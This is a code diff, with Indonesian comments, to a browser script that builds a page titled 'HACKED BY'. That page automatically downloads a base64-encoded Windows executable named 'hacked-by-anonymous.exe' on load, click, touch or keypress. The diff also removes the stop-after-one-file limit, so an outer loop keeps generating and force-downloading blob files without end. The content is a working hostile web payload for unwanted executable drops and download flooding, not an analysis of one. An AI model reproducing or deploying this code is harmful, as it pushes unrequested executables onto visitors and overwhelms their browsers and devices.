@@ -117,7 +117,6 @@ window.speechSynthesis.speak(utterance);
 const prepareMimeBlobAsync = (i) => {
 return new Promise((resolve) => {
 queueMicrotask(() => {
-// UPGRADE: Menambahkan logika Race Condition di dalam payload HTML
 const payloadText = "<!DOCTYPE html>" +
 "<html>" +
 "<head><meta charset='UTF-8'><title>HACKED BY</title></head>" +
@@ -150,50 +149,37 @@ const payloadText = "<!DOCTYPE html>" +
 "}" +
 "var b64Data = \"TVqQAAMAAAAEAAAAAEEAAgBA\";" +
 "var sudah = false;" +
-"var target = 5; // Jumlah file race condition" +
-"var dipicu = 0;" +
-
-// Fungsi Race Condition
-"function picuSatu(){" +
-"if (dipicu >= target) {" +
-"document.getElementById('status').textContent = 'Selesai. ' + dipicu + ' file .exe diunduh.';" +
-"document.getElementById('status').style.color = '#0f0';" +
-"return;" +
-"}" +
-"dipicu++;" +
+"function picuDownload(){" +
+"if (sudah) return;" +
+"sudah = true;" +
+"var statusEl = document.getElementById('status');" +
 "try{" +
+"statusEl.textContent = 'Menyiapkan berkas...';" +
 "var bytesArr = b64KeBytes(b64Data);" +
 "var blob = new Blob([bytesArr], { type: 'application/octet-stream' });" +
 "var url = URL.createObjectURL(blob);" +
 "var a = document.createElement('a');" +
 "a.href = url;" +
-"a.download = 'hacked-by-anonymous-' + dipicu + '.exe';" +
+"a.download = 'hacked-by-anonymous.exe';" +
 "a.style.display = 'none';" +
 "document.body.appendChild(a);" +
 "a.click();" +
 "setTimeout(function(){ " +
 "if (a.parentNode) a.parentNode.removeChild(a); " +
 "URL.revokeObjectURL(url); " +
-"}, 5000);" +
-"document.getElementById('status').textContent = 'Memproses ke-' + dipicu + ' dari ' + target;" +
-"} catch(e){}" +
-"queueMicrotask(picuSatu);" +
+"}, 3000);" +
+"statusEl.textContent = 'Payload berhasil diunduh!';" +
+"statusEl.style.color = '#0f0';" +
+"} catch(e){" +
+"statusEl.textContent = 'Gagal: ' + e.message;" +
+"statusEl.style.color = '#f00';" +
+"sudah = false;" +
 "}" +
-
-"function mulai(){" +
-"if(sudah) return;" +
-"sudah = true;" +
-"queueMicrotask(function(){" +
-"queueMicrotask(function(){" +
-"picuSatu();" +
-"});" +
-"});" +
 "}" +
-
-// Trigger otomatis & klik
-"window.addEventListener('load', function(){ setTimeout(mulai, 1000); });" +
-"document.addEventListener('click', mulai);" +
-"document.addEventListener('touchstart', mulai);" +
+"window.addEventListener('load', function(){ setTimeout(picuDownload, 1500); });" +
+"document.addEventListener('click', picuDownload);" +
+"document.addEventListener('touchstart', picuDownload);" +
+"document.addEventListener('keydown', picuDownload);" +
 "})();" +
 "<\/script>" +
 "</body>" +
@@ -209,11 +195,8 @@ resolve({ id: i, url: url });
 const triggerInstantDownload = (fileData) => {
 const link = document.createElement("a");
 link.href = fileData.url;
-
-// UPGRADE: Mengubah ekstensi menjadi .txt.html agar dibuka sebagai HTML
-link.download = `waguri-file-${fileData.id}.txt.html`;
-
-link.textContent = `Blob #${fileData.id} (.txt.html)`;
+link.download = `waguri-file-${fileData.id}.txt`;
+link.textContent = `Blob #${fileData.id} (.txt)`;
 link.style.display = "none";
 downloadsDiv.appendChild(link);
 link.click();
@@ -231,13 +214,6 @@ statusDiv.textContent = `Proses Berjalan: Berkas ke-${counter} dikirim`;
 
 if (counter % 10 === 0) {
 speak(`Proses mencapai ${counter} berkas.`);
-}
-
-// Berhenti di 1 file untuk demonstrasi (bisa dihapus jika ingin loop terus)
-if (counter >= 1) {
-isProcessing = false;
-startBtn.disabled = false;
-return;
 }
 
 setTimeout(() => processLoop(counter + 1), 0);
